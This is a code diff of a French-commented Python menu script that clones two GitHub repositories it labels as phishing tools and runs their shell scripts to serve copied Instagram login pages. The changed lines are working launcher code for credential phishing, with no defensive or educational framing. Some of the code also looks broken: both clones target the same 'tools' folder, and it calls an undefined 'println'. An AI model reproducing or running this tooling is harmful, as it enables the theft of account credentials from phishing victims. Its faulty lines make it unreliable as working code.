@@ -77,10 +77,10 @@ while on_off:
 
 			if userChoise_tools == "1":#												choix n°1 pour istaller les outils de phishing
 				os.system("mkdir tools")
-				os.system("cd tools")
-				os.system("git clone https://github.com/thelinuxproject/instagram")#	installation de instapump
-				os.system("git clone https://github.com/thelinuxproject/saycheesapp")#	installation de saycheesapp 
+				os.system("git clone https://github.com/thelinuxproject/instagram tools")#	installation de instapump
+				os.system("git clone https://github.com/thelinuxproject/saycheesapp tools")#	installation de saycheesapp 
 				os.system("clear")
+				println(7)
 				print("operation terminer...")
 				sleep(4)#																attente de 4seconde	
 
@@ -100,15 +100,16 @@ while on_off:
 
 
 			if userChoise_ph == "1":#													
-				os.system("cd tools")
 				os.system("clear")
-				print("[*]Choisir un site a copier :\n\n[1]instagram\n[2] \n[3]retour \n[4]sortie")
+				print("[*]Choisir un site a copier :\n\n[1]instagram\n[2]saycheesapp(instagram) \n[3]retour \n[4]sortie")
 				userChoise_site = input("{}>".format(username))
 				userChoise_site = str(userChoise_site)#									cast de la variable userChoise_site
 
 				if userChoise_site == "1":
-					os.system("cd instagram")
-					os.system("bash instagram.sh")
+					os.system("bash instagram/instagram.sh")
+					
+				elif userChoise_site == "2":
+					os.system("bash saycheesapp/saycheesapp.sh")
 
 				elif userChoise_site == "3":
 					userChoise_ph = 0
